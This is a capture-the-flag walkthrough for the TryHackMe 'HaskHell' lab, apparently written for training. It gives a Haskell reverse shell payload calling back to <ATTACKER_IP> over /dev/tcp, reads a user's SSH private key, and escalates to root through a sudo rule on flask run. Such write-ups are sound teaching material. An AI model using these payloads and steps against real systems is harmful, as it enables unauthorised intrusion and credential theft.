# [HaskHell](https://tryhackme.com/room/haskhell)

## Teach your CS professor that his PhD isn't in security.

# HaskHell

## Show your professor that his PhD isn't in security.

### Get the flag in the user.txt file.

1. First, let's discover what services are running on the target machine

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Let's perform directory enumeration to find available endpoints
   - Found endpoint: `http://<TARGET_IP>:5001/submit`

```bash
gobuster dir -u http://<TARGET_IP>:5001 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

3. Test the code submission functionality by uploading a simple Haskell file to `http://<TARGET_IP>:5001/submit` then visit `http://<TARGET_IP>:5001/uploads/test.hs` to see it executes

```haskell
main :: IO ()
main = putStrLn "Hello World"
```

[SCREEN02]

4. Set up a netcat listener and create a malicious Haskell reverse shell payload using `System.Process`

```bash
nc -lvnp 4444
```

```haskell
import System.Process
main = callCommand "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

5. Once connected, navigate to the prof user's home directory and read the user flag

```bash
cat /home/prof/user.txt
```

[SCREEN03]

---

### Obtain the flag in root.txt

1. Explore the user's home directory and discover SSH private key

```bash
cat /home/prof/.ssh/id_rsa
```

[SCREEN04]

2. Copy the private key to your local machine, set proper permissions on the SSH key and connect as prof user

```bash
chmod 600 id_rsa
ssh -i id_rsa prof@<TARGET_IP>
```

3. Check what sudo privileges the prof user has
   - The user can run `/usr/bin/flask run` as root without password

```bash
sudo -l
```

[SCREEN05]

4. Abuse Flask's `FLASK_APP` environment variable to execute arbitrary Python code as root

```bash
echo 'import os; os.system("/bin/bash")' > /tmp/app.py
export FLASK_APP=/tmp/app.py
sudo /usr/bin/flask run
```

[SCREEN06]

5. Read the root flag from the root directory

```bash
cat /root/root.txt
```

[SCREEN07]
